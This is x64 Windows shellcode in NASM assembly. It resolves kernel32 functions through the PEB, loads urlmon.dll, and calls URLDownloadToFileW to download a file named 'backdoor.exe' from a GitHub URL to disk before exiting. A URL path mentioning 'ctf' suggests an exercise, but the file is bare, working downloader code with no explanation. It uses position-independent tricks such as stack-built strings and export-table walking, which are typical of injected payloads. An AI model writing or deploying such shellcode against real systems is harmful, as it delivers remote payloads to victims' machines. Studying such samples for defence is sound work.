BITS 64
SECTION .text
global main

main:
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x41636f7250746547          ; GetProcA
  get_getprocAddr : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_getprocAddr 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    xor rdi, rdi 
    mov r14d, [rsi + rcx * 4]            ; rva address of winexec 
    add r14, rbx                        ; address of GetProcAddress 

    ; get LoadLibraryA address by calling GetProcAddress
    ; GetProcAddress(lib_base, function_name) 
    xor rdx, rdx 
    mov edx, 0x41797261 
    push rdx 
    mov rdx, 0x7262694c64616f4c         ; LoadLibraryA 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rsi, rax                        ; address of LoadLibraryA functions 

    ; load urlmon.dll to use URLDownloadToFile 
    ; LoadLibraryA("VCRUNTIME140D.dll")             <-- cần load trước khi load urlmon.dll  
    xor rcx, rcx 
    mov cl, 0x6c 
    push rcx 
    mov rcx, 0x6c642e4430343145
    push rcx 
    mov rcx, 0x4d49544e55524356 
    push rcx
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi 
    add rsp, 0x30 

    ; LoadLibraryA("urlmon.dll")
    xor rcx, rcx 
    mov cx, 0x6c6c 
    push rcx 
    mov rcx, 0x642e6e6f6d6c7275 
    push rcx
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi 
    add rsp, 0x30 
    mov r15, rax                           ; address of urlmon.dll 

    ; GetProcAddress(urlmon.dll, "URLDownloadToFileW") 
    mov rcx, r15                            ; handle to urlmon.dll 
    xor rdx, rdx 
    mov dx, 0x4165 
    push rdx 
    mov rdx, 0x6c69466f5464616f
    push rdx 
    mov rdx, 0x6c6e776f444c5255 
    push rdx 
    mov rdx, rsp 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax                                ; address of URLDowloadToFile 

    jmp getURL
returnURL : 
    pop rdx                                     ; szURL
    xor r8, r8 
    mov r8d, 0x6578652e
    push r8 
    mov r8, 0x3237663731653832 
    push r8
    mov r8, 0x6437663336393664
    push r8 
    mov r8, 0x3062663432646333
    push r8 
    mov r8, 0x3839303531303039
    push r8  
    mov r8, rsp                                 ; szFileName 
    xor rcx, rcx                                ; pCaller  
    xor r9d, r9d                                ; dwReserved 
    sub rsp, 0x30 
    mov [rsp + 0x20], rcx                       ; lpfnCB  
    call r13 
    add rsp, 0x30  

    ; GetProcAddress(kernel32.dll, 'ExitProcess') 
    xor rdx, rdx 
    mov edx, 0x737365aa 
    shr edx, 8 
    push rdx 
    mov rdx, 0x636f725074697845
    push rdx 
    mov rdx, rsp 
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rdi, rax

    ; ExitProcess(0) 
    xor rcx, rcx 
    call rdi 




getURL : 
    call returnURL 
    db "https://github.com/hacmao/hacmao.github.io/raw/master/re/ctf/backdoor.exe"


